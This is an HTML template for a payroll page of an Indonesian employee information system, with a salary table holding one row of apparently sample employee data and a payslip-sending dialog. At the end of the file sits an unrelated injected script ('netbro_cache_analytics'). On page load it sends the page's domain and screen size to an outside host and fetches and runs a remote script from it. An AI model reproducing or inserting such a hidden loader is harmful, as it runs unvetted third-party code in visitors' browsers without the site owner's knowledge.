<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="shortcut icon" href="/image/favicon.png">
    <title>Penggajian</title>
    <link rel="stylesheet" type="text/css" href="assets/lib/perfect-scrollbar/css/perfect-scrollbar.min.css"/>
    <link rel="stylesheet" type="text/css" href="assets/lib/material-design-icons/css/material-design-iconic-font.min.css"/>
    <link rel="stylesheet" type="text/css" href="assets/lib/datatables/css/dataTables.bootstrap.min.css"/>

    <link rel="stylesheet" href="/assets/css/datakaryawan.css" type="text/css"/>
    <link rel="stylesheet" href="/assets/css/style.css" type="text/css"/>
    
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
    <link rel="stylesheet" type="text/css" href="assets/lib/jquery.vectormap/jquery-jvectormap-1.2.2.css"/>
    <link rel="stylesheet" type="text/css" href="assets/lib/jqvmap/jqvmap.min.css"/>
    <link rel="stylesheet" type="text/css" href="assets/lib/datetimepicker/css/bootstrap-datetimepicker.min.css"/>
  </head>
  <body>
    <!-- Wrapper Start -->
    <div class="be-wrapper">

      <!--  Sidebar Start -->  
      <div class="be-wrapper be-fixed-sidebar">
        @include('Beranda.sidebar')
      </div>
      <!--  Sidebar End --> 

      <!-- Konten -->
      <div class="be-content">
        <h3 class="page-header"><i class="fa fas fa-money-check-alt"></i><span>Penggajian</span></h3>
        <div class="main-content container-fluid">
          <div class="row">
            <div class="col-sm-12">
              <div class="panel panel-default panel-table">
                 <div class="panel-heading">Tabel
                  <div class="tools dropdown">
                    <button  type="button" class="btn btn-space btn-primary"> Unduh Laporan</button>
                      <button data-toggle="modal" data-target="#kirim" type="button" class="btn btn-space btn-primary"> Kirim Slip Gaji </button>
                  </div>
                </div>
                <div class="panel-body">
                   <div class="table-responsive noSwipe">
                  <table id="table1" class="table table-striped table-hover table-fw-widget">
                    <thead>
                      <tr>
                        <th>NIK</th>
                <th>Nama</th>
                <th>Fungsi</th>
                <th>Pengalaman</th>
                <th>Gaji Pokok</th>
                <th>Tunjangan Profesi</th>
                <th>Tunjangan Jabatan</th>
                <th>Tunjangan Kinerja</th>
                <th>Tunjangan Khusus</th>
                <th>Tunjangan Transport</th>
                <th>Hari Transport</th>
                <th>Besaran Tunjangan Transportasi</th>
                <th>Perhitungan BPJS Kesehatan</th>
                <th>Perhitungan BPJS Ketenagakerjaan</th>
                <th>BPJS Kesehatan Perusahaan</th>
                <th>BPJS Kesehatan Karyawan</th>
                <th>JKK</th>
                <th>JKM</th>
                <th>JHT</th>
                <th>Total</th>
                <th>Insentif</th>
                <th>Bonus</th>
                <th>Disinsentif</th>
                <th>Total Gaji</th>
                <th>Masa Kerja</th>
                <th>Gaji Setahun</th>
                <th>JHT Karyawan</th>
                <th>Biaya Jabatan</th>
                <th>Gaji dikurangi Biaya Jabatan dan JHT</th>
                <th>Status</th>
                <th>PTKP</th>
                <th>PKP/th</th>
                <th>TP</th>
                <th>NPWP</th>
                <th>TP real</th>
                <th>PPh 21 Gaji</th>
                <th>Potongan</th>
                <th>Potongan BPJS</th>
                <th>Dibayar</th>
                <th>No.Rekening</th>
                <th>Keterangan Potongan</th>
                <th>Keterangan Absen, Disinsentif dan Insentif</th>
                <th>Tindakan</th>
                    </thead>
                    <tbody>
                      <tr class="odd gradeA">
                       <td>1234567098765432</td>
                  <td>Adinda Virguinia Ayu Permata Manihuruk</td>
                  <td>-</td>
                  <td>204</td>
                  <td>Rp 3,200,000</td>
                  <td>Rp 4,000,000</td>
                  <td>Rp 12,500,000</td>
                  <td>Rp -</td>
                  <td>Rp 7,000,000</td>
                  <td>Rp 285,000</td>
                  <td>19</td>
                  <td>Rp 15,000</td>
                  <td>Rp 4,100,000</td>
                  <td>Rp 3,340,000</td>
                  <td>Rp 164,000</td>
                  <td>Rp 41,000</td>
                  <td>Rp 8,016</td>
                  <td>Rp 10,020</td>
                  <td>Rp 123,580</td>
                  <td>Rp 182,036</td>
                  <td>-</td>
                  <td>-</td>
                  <td>-</td>
                  <td>Rp 27,500,000</td>
                  <td>12</td>
                  <td>Rp 330,000,000</td>
                  <td>Rp 801,600</td>
                  <td>Rp 6,000,000</td>
                  <td>Rp 323,000,000</td>
                  <td>TK/2</td>
                  <td>63,000,000</td>
                  <td>260,000,000</td>
                  <td>Progresif</td>
                  <td>4567899876543234567</td>
                  <td>Progresif</td>
                  <td>Rp 3,000,000</td>
                  <td>Rp 12,000,000</td>
                  <td>Rp 225,000</td>
                  <td>Rp 12,400,000</td>
                  <td>456 567987654</td>
                  <td>BRI</td>
                  <td>3 hari datang diatas jam 9</td>
                  <td >
                   <a href="/penggajian_edit">
                          <button type="button" class="btn btn-space btn-warning"> Edit </button></a> 
                  </td>
                      </tr>
                    </tbody>
                  </table>
                </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>


         <!-- Kirim Slip Gaji Modal-->
      <div id="kirim" class="modal fade">
        <div class="modal-content">
          <div class="modal-header">
            <button type="button" data-dismiss="modal" aria-hidden="true" class="close modal-close"><span class="mdi mdi-close"></span></button>
          </div>
          <div class="modal-body">
            <div class="text-center">
              <div class="text-primary"><span class="modal-main-icon mdi mdi-check"></span></div>
              <h3>Kirim Slip Gaji?</h3>
              <div class="xs-mt-50">
                <button type="button" data-dismiss="modal" class="btn btn-default btn-space modal-close">Batal</button>
                <button type="button" data-dismiss="modal" class="btn btn-primary btn-space modal-close">Kirim</button>
              </div>
            </div>
          </div>
          <div class="modal-footer"></div>
        </div>
      </div> 
      <!-- Akhir Kirim Slip Gaji Modal-->

   
     <div class="text-center">
      <div class="credits">
        <p>Sistem Informasi Karyawan<b> Idea Imaji Persada</b></p>
      </div>
      </div>
    </div>

    <!-- JS untuk opsi resign di bagian edit data karyawan -->

    <script src="assets/lib/jquery/jquery.min.js" type="text/javascript"></script>
    <script src="assets/lib/perfect-scrollbar/js/perfect-scrollbar.jquery.min.js" type="text/javascript"></script>
    <script src="assets/js/main.js" type="text/javascript"></script>
    <script src="assets/lib/bootstrap/dist/js/bootstrap.min.js" type="text/javascript"></script>
    <script src="assets/lib/datatables/js/jquery.dataTables.min.js" type="text/javascript"></script>
    <script src="assets/lib/datatables/js/dataTables.bootstrap.min.js" type="text/javascript"></script>
    <script src="assets/lib/datatables/plugins/buttons/js/dataTables.buttons.js" type="text/javascript"></script>
    <script src="assets/lib/datatables/plugins/buttons/js/buttons.html5.js" type="text/javascript"></script>
    <script src="assets/lib/datatables/plugins/buttons/js/buttons.flash.js" type="text/javascript"></script>
    <script src="assets/lib/datatables/plugins/buttons/js/buttons.print.js" type="text/javascript"></script>
    <script src="assets/lib/datatables/plugins/buttons/js/buttons.colVis.js" type="text/javascript"></script>
    <script src="assets/lib/datatables/plugins/buttons/js/buttons.bootstrap.js" type="text/javascript"></script>

    <script type="text/javascript">
      $(document).ready(function(){
        //initialize the javascript
        App.init();
        App.dataTables();
      });
    </script>

    <script type="text/javascript">
      document.getElementById("status").onchange = function () {
      document.getElementById("alasan").setAttribute("disabled", "disabled");
       document.getElementById("tgl_resign").setAttribute("disabled", "disabled");
      if (this.value == 'Resign')
        document.getElementById("alasan").removeAttribute("disabled");
      if (this.value == 'Resign')
      document.getElementById("tgl_resign").removeAttribute("disabled");
      };

      // Fungsi Logout

      $(function(){
          $('a#logout').click(function(){
              if(confirm('Apakah anda yakin ingin keluar ?')) {
                  return true;
              }

              return false;
                });
            });


      // Fungsi Menu dashboard

      $(document).ready(function(){

          App.init();
          App.dashboard();

          });
      </script>

      <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function() {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mrwd1XyoNwUzpvf2l56FucADiEx%2bf3JAPJogkNU%2biFfwCiZ%2bA5y%2fz1GPfkI78hOjpKGi13lyWOD4PTAvdGjGONrTkbHyQtyDiXMT6f73PUxXAafylPFQAofDmqSRGCN6kLPoPHF5oxuxg%2bsgcyENso77BDI%2biq12wLsMGa%2bin6lXObrjR5nN3n3mCHDOu9rOERnmtSCzsvQVvQC2um1T%2fNsq2QIjE4KBpR9Vkl2LpxVPpB5ls%2failQCaTL23yQg6%2fVmE4aJahv4ErgHCjfL9mX4EPIxsCfVSS1MVwUyVfrSegVjjaXYDrZcarSkz7F2VXD0r3sg%2bPtdKUwpPNNQOOz0e5p%2bJ9WrZ7lxjycaB2F9Ci38ljGYNDUDDsnXT6j2Y7m3PBs%2bu3Atlk%2f2VykRlaJnvFNX%2bS%2flT5eDv6PQdmrWoWEBnXUCINHwnSwu3Cu7NudtMWlNGrsWK93HbdfLL45H%2f2NwIlDGeGNFBHlAFq869dDf3eePYoKSnP2OLHCFol" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function() {});
        };

      </script>

</body>
</html>
